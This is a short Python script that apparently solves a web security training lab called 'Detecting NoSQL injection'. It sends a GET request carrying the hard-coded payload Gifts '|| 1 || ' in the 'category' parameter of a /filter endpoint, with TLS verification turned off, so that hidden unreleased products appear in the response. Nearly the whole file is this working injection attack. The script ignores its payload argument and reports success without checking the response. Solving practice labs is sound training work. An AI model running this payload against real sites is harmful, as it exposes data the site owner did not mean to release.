import requests
import urllib3
import re
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Detecting NoSQL injection"


def run(url, payload, proxies=None):
    url = url.rstrip('/')

    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Inject payload into "category" query parameter to retrieve unreleased products\n2. Observe unreleased products in the response\n""")

    print("[+] Injection parameter: " + Fore.YELLOW + "category")

    payload = f"Gifts '|| 1 || '"

    try:
        r = requests.get(
            f"{url}/filter?category={payload}", verify=False, allow_redirects=False, proxies=proxies)
        print(Fore.WHITE + "Injecting payload to retrieve unreleased products")
        return True

    except Exception as e:
        print(f"[!] Failed to fetch payload through exception")
        return False
